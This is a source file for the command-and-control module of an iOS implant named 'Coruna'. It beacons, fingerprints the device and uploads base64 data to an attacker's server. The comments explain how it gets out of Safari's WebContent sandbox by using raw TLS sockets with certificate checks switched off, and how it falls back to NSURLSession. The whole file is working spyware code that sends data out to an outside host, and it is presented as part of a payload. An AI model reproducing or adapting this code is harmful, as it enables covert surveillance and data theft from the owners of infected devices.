/*
 * c2.c — C2 communication for Coruna payload (Objective-C + C, ARM64 iOS)
 *
 * Two upload channels:
 *
 *   Channel B — raw POSIX socket + SecureTransport TLS  [PRIMARY]
 *     Uses socket()/connect() + Security.framework SSLCreateContext.
 *     Works inside WebContent because it does NOT use nsurlsessiond XPC
 *     (which is blocked by WebContent's sandbox policy).
 *     WebContent sandbox allows outbound TCP to port 443.
 *
 *   Channel A — NSURLSession  [FALLBACK]
 *     Higher-level, handles redirects, modern session management.
 *     Blocked inside WebContent (nsurlsessiond XPC is denied by sandbox).
 *     Used as fallback in case Channel B fails outside WebContent.
 *
 * Ordering: Channel B is tried first for ALL calls.  This avoids a 12-second
 * per-call penalty in WebContent where Channel A always fails immediately.
 */

#import <Foundation/Foundation.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/utsname.h>
#include <sys/sysctl.h>

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
#import <Security/SecureTransport.h>
#pragma clang diagnostic pop

#include "c2.h"

/* ── Persistent device UUID ─────────────────────────────────────────────────
 *
 * Priority:
 *   1. __ds_dsid  — UUID written by Stage3_VariantB before calling _process().
 *                   Ensures the dylib and JS chain share the same device UUID.
 *   2. __cru_id   — UUID persisted by a previous dylib run.
 *   3. Fresh UUID — first-run fallback; stored under __cru_id for next time.
 *
 * [d synchronize] is deprecated in iOS 12+ but called explicitly because
 * WebContent is often jetsam-killed; without it the plist may not reach disk.
 */
static NSString *coruna_device_uuid(void) {
    static NSString *cached = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
        NSString *u = [d stringForKey:@"__ds_dsid"];
        if (!u || u.length < 8)
            u = [d stringForKey:@"__cru_id"];
        if (!u || u.length < 8)
            u = [[NSUUID UUID] UUIDString];
        [d setObject:u forKey:@"__cru_id"];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
        [d synchronize];
#pragma clang diagnostic pop
        cached = u;
    });
    return cached;
}

/* ── Safe UTF-8 string helper ───────────────────────────────────────────────
 * stringWithUTF8String: returns nil on invalid bytes; fall back to "" so
 * the upload is never dropped due to an encoding issue.
 */
static NSString *c2_safe_str(const char *s) {
    if (!s) return @"";
    NSString *r = [NSString stringWithUTF8String:s];
    return r ? r : @"";
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Channel B — raw POSIX socket + SecureTransport TLS
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef struct { int fd; } ssl_conn_ctx;

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

static OSStatus ssl_read_fn(SSLConnectionRef ref, void *data, size_t *len) {
    int fd = ((ssl_conn_ctx *)ref)->fd;
    ssize_t n;
    do { n = recv(fd, data, *len, 0); } while (n < 0 && errno == EINTR);
    if (n > 0)  { *len = (size_t)n; return noErr; }
    *len = 0;
    return (n == 0) ? errSSLClosedGraceful : errSSLClosedAbort;
}

static OSStatus ssl_write_fn(SSLConnectionRef ref, const void *data, size_t *len) {
    int fd = ((ssl_conn_ctx *)ref)->fd;
    ssize_t n;
    do { n = send(fd, data, *len, 0); } while (n < 0 && errno == EINTR);
    if (n > 0)  { *len = (size_t)n; return noErr; }
    *len = 0;
    return errSSLClosedAbort;
}

/*
 * raw_https_post — blocking HTTPS POST over a raw TCP + TLS socket.
 *
 * Returns true when the server returns at least a partial HTTP response.
 *
 * Key properties:
 *  • connect() uses O_NONBLOCK + select() with a 10-second timeout so we
 *    never hang indefinitely if the server is temporarily unreachable.
 *  • SO_RCVTIMEO / SO_SNDTIMEO protect TLS I/O operations (10 s each).
 *  • kSSLSessionOptionBreakOnServerAuth: certificate validation is bypassed
 *    (we continue unconditionally after errSSLServerAuthCompleted).
 *    This makes the upload work regardless of cert issuer or expiry.
 */
static bool raw_https_post(const char *host, int port, const char *path,
                           const char *uuid_str,
                           const uint8_t *body, size_t body_len) {
    /* DNS resolution */
    struct addrinfo hints, *res = NULL;
    __builtin_memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%d", port);
    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res)
        return false;

    int fd = socket(res->ai_family, SOCK_STREAM, 0);
    if (fd < 0) { freeaddrinfo(res); return false; }

    /* Non-blocking connect with 10-second deadline */
    bool connected = false;
    {
        int flags = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);

        int cr = connect(fd, res->ai_addr, res->ai_addrlen);
        if (cr == 0) {
            connected = true;   /* connected immediately (unusual but valid) */
        } else if (errno == EINPROGRESS) {
            struct timeval ct = {10, 0};
            fd_set wfds, efds;
            FD_ZERO(&wfds); FD_SET(fd, &wfds);
            FD_ZERO(&efds); FD_SET(fd, &efds);
            int sr = select(fd + 1, NULL, &wfds, &efds, &ct);
            if (sr > 0 && FD_ISSET(fd, &wfds) && !FD_ISSET(fd, &efds)) {
                int err = 0; socklen_t elen = sizeof(err);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen);
                connected = (err == 0);
            }
        }

        /* Restore blocking mode for SSL I/O */
        fcntl(fd, F_SETFL, flags);
    }

    freeaddrinfo(res);

    if (!connected) { close(fd); return false; }

    /* 10-second I/O timeout for SSL send/recv */
    struct timeval tv = {10, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    bool ok = false;
    ssl_conn_ctx sconn = {fd};
    SSLContextRef ctx = SSLCreateContext(NULL, kSSLClientSide, kSSLStreamType);
    SSLSetIOFuncs(ctx, ssl_read_fn, ssl_write_fn);
    SSLSetConnection(ctx, &sconn);
    SSLSetPeerDomainName(ctx, host, strlen(host));
    /* Break on cert auth so we can skip validation and continue */
    SSLSetSessionOption(ctx, kSSLSessionOptionBreakOnServerAuth, true);

    OSStatus s;
    int tries = 8;
    /* errSSLServerAuthCompleted = cert break: continue unconditionally.
     * errSSLWouldBlock = shouldn't occur on blocking socket, but guard anyway. */
    do {
        s = SSLHandshake(ctx);
    } while ((s == errSSLWouldBlock || s == errSSLServerAuthCompleted) && --tries > 0);

    if (s == noErr) {
        char hdr[512];
        int hdr_len = snprintf(hdr, sizeof(hdr),
            "POST %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: %zu\r\n"
            "X-Device-UUID: %s\r\n"
            "Connection: close\r\n\r\n",
            path, host, body_len, uuid_str ? uuid_str : "");

        size_t wrote = 0;
        if (SSLWrite(ctx, hdr, (size_t)hdr_len, &wrote) == noErr &&
            SSLWrite(ctx, body, body_len, &wrote) == noErr) {
            /* Drain the first chunk of the HTTP response */
            uint8_t buf[512];
            size_t nread = 0;
            OSStatus rs = SSLRead(ctx, buf, sizeof(buf), &nread);
            ok = (rs == noErr || rs == errSSLClosedGraceful) && nread > 0;
        }
    }

    SSLClose(ctx);
    CFRelease(ctx);
    close(fd);
    return ok;
}

#pragma clang diagnostic pop   /* -Wdeprecated-declarations */

/* ═══════════════════════════════════════════════════════════════════════════
 * Channel A — NSURLSession (fallback for non-WebContent environments)
 * ═══════════════════════════════════════════════════════════════════════════ */
static bool nsurlsession_post(NSURL *url, NSData *body, NSString *uuid) {
    __block bool succeeded = false;
    NSMutableURLRequest *req =
        [NSMutableURLRequest requestWithURL:url
                                cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                            timeoutInterval:10.0];
    [req setHTTPMethod:@"POST"];
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [req setValue:uuid forHTTPHeaderField:@"X-Device-UUID"];
    [req setHTTPBody:body];

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    NSURLSessionConfiguration *cfg =
        [NSURLSessionConfiguration ephemeralSessionConfiguration];
    cfg.timeoutIntervalForRequest  = 10.0;
    cfg.timeoutIntervalForResource = 10.0;

    NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];
    [[session dataTaskWithRequest:req
                completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        succeeded = (e == nil && r != nil);
        dispatch_semaphore_signal(sem);
    }] resume];

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW,
                                               12 * NSEC_PER_SEC));
    [session invalidateAndCancel];
    return succeeded;
}

/* ── JSON body builder ─────────────────────────────────────────────────────*/
static NSData *make_json_body(NSString *uuid, const char *category,
                              const char *path, const char *description,
                              const char *b64data) {
    NSDictionary *d = @{
        @"deviceUUID":  uuid,
        @"category":    c2_safe_str(category    ?: "data"),
        @"path":        c2_safe_str(path        ?: ""),
        @"description": c2_safe_str(description ?: ""),
        @"data":        c2_safe_str(b64data     ?: ""),
    };
    return [NSJSONSerialization dataWithJSONObject:d options:0 error:nil];
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Public API
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * upload_to_c2 — post one JSON record; Channel B (raw socket) is tried first.
 *
 * Channel B is the reliable path inside WebContent where nsurlsessiond XPC is
 * blocked.  Channel A (NSURLSession) is the fallback for environments where
 * Channel B is somehow unavailable (e.g. rare proxy/firewall setup).
 *
 * Total worst-case blocking time: ~10 s (Channel B only) or ~22 s (B fails,
 * A also fails).  In practice Channel B succeeds and returns in <2 s.
 */
void upload_to_c2(const char *category, const char *path,
                  const char *description, const char *b64data) {
    @autoreleasepool {
        NSString *uuid = coruna_device_uuid();
        NSData   *body = make_json_body(uuid, category, path, description, b64data);
        if (!body) return;

        /* Channel B — primary (works in WebContent) */
        bool sent = raw_https_post(C2_DOMAIN, C2_PORT, C2_UPLOAD,
                                   uuid.UTF8String,
                                   (const uint8_t *)body.bytes, body.length);

        /* Channel A — fallback */
        if (!sent) {
            NSString *scheme = C2_USE_HTTPS ? @"https" : @"http";
            NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
                                scheme, C2_DOMAIN, C2_UPLOAD];
            NSURL *url = [NSURL URLWithString:urlStr];
            if (url) nsurlsession_post(url, body, uuid);
        }
    }
}

/*
 * upload_beacon — synchronous diagnostic probe called from process() before
 * the background thread starts.
 *
 * Uses Channel B (raw socket) directly for immediate reliability.
 * A record in server logs confirms: binary v1.3 is running, raw-socket path
 * works inside WebContent sandbox.
 * Falls back to Channel A if Channel B fails.
 */
void upload_beacon(void) {
    @autoreleasepool {
        char ios_ver[64] = "?";
        size_t vs = sizeof(ios_ver);
        sysctlbyname("kern.osproductversion", ios_ver, &vs, NULL, 0);

        NSString *uuid = coruna_device_uuid();
        NSString *desc = [NSString stringWithFormat:
                          @"beacon v" PAYLOAD_VERSION " ios=%s pid=%d proc=%s",
                          ios_ver, (int)getpid(), getprogname() ?: "?"];

        NSData *body = make_json_body(uuid,
                                      "system", "/coruna/beacon",
                                      desc.UTF8String, "");
        if (!body) return;

        /* Channel B first */
        bool sent = raw_https_post(C2_DOMAIN, C2_PORT, C2_UPLOAD,
                                   uuid.UTF8String,
                                   (const uint8_t *)body.bytes, body.length);
        /* Channel A fallback */
        if (!sent) {
            NSString *scheme = C2_USE_HTTPS ? @"https" : @"http";
            NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
                                scheme, C2_DOMAIN, C2_UPLOAD];
            NSURL *url = [NSURL URLWithString:urlStr];
            if (url) nsurlsession_post(url, body, uuid);
        }
    }
}

/*
 * upload_device_info — full device identification record.
 */
void upload_device_info(void) {
    @autoreleasepool {
        struct utsname un;
        uname(&un);

        char ios_ver[64] = "unknown";
        size_t vs = sizeof(ios_ver);
        sysctlbyname("kern.osproductversion", ios_ver, &vs, NULL, 0);

        char kern_ver[256] = "unknown";
        size_t ks = sizeof(kern_ver);
        sysctlbyname("kern.version", kern_ver, &ks, NULL, 0);

        NSDictionary *info = @{
            @"version":      @(PAYLOAD_VERSION),
            @"machine":      @(un.machine),
            @"sysname":      @(un.sysname),
            @"release":      @(un.release),
            @"ios_version":  @(ios_ver),
            @"kern_version": @(kern_ver),
        };

        NSData *json = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
        if (!json) return;
        NSString *b64 = [json base64EncodedStringWithOptions:0];
        upload_to_c2("system", "/coruna/device_info",
                     "Device identification v" PAYLOAD_VERSION, b64.UTF8String);
    }
}

/*
 * c2_heartbeat — confirms the implant background thread is alive.
 */
void c2_heartbeat(void) {
    upload_to_c2("system", "/coruna/heartbeat",
                 "coruna implant alive", "aGVhcnRiZWF0");
}

/*
 * Legacy stub — kept for ABI compatibility.
 */
void send_to_c2(const uint8_t *data, size_t len) {
    (void)data; (void)len;
}
